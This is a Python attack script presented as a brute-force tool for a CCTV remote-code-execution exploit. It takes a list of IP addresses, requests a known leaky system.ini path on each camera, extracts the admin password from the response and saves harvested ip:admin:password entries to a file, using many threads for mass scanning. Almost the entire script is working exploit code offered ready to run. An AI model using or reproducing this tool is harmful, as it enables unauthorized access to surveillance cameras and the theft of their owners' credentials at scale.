#!/usr/bin/python
# Bruteforce tool for CCTV RCE Exploit
# You don't have to edit anything.
# Scanner https://pastebin.com/dS0G0jba
# -*- coding: ascii -*-
import urllib.request, threading, socket, time, sys
if len(sys.argv) != 2:
	print("\x1b[0;37mCorrect useage: python3 " + sys.argv[0].split("\\").pop() + " <thread count> ")
	sys.exit()
	
lock, finalprintout, timeout, creds, threads, threadcount, leak, total = threading.Lock(), "", 5, [], [], int(sys.argv[1]), "http://TARGET/system.ini?loginuse&loginpas", 0

# reads & outputs to < output.txt
list = open("output.txt", "r")
scan = list.read()
list.close()

scan = scan.split("\n")
while "\n" in scan:
	scan.remove("\n")
pretotal = len(scan)
def dumpcreds():
	global finalprintout
	global total
	global scan
	while len(scan) > 0:
		try:
			with lock:
				ip = scan.pop()
			with urllib.request.urlopen(leak.replace("TARGET", ip), None, timeout) as response:
				reply = str(response.read())
				if reply.find("admin") != -1:
					reply = reply[reply.find("admin"):]
					while reply.find("\\x00") != -1:
						reply = reply.replace("\\x00", "")
					password = reply[5:reply.find("\\")]
					if password.find("/") != -1:
						password = password[:password.find("/")]
					print("    |\x1b[0;36mFound Format -> ip:port user:pass arch\x1b[0;37m| admin:" + password + "@" + ip)
					with lock:
						finalprintout += ip + ":admin:" + password + "\n"
						total += 1
		except:
			pass


print("[scanner] Scanner process initialized. Scanning started\n")
time.sleep(21)
print("[scanner: DEBUG IP] finished telnet negotiation\n")

for i in range(0, threadcount+1):
	threads.append(threading.Thread(target=dumpcreds))

for thread in threads:
	try:
		thread.daemon = True
		thread.start() 
	except:
		pass

for thread in threads:
	try:
		thread.join()
	except:
		pass
		
while 1:
	time.sleep(1)
	done = False
	for thread in threads:
		if thread.isAlive() == True:
			done = False
			break
		else:
			done = True
	if done == True:
		writingit = open("vuln.txt", "w")
		writingit.write(finalprintout)
		writingit.close()
		print(str(total) + " of out " + str(pretotal) + " [scanner] received username:password prompt\n " + str(int(100 / pretotal * total)) + "% success rate. ")
		break
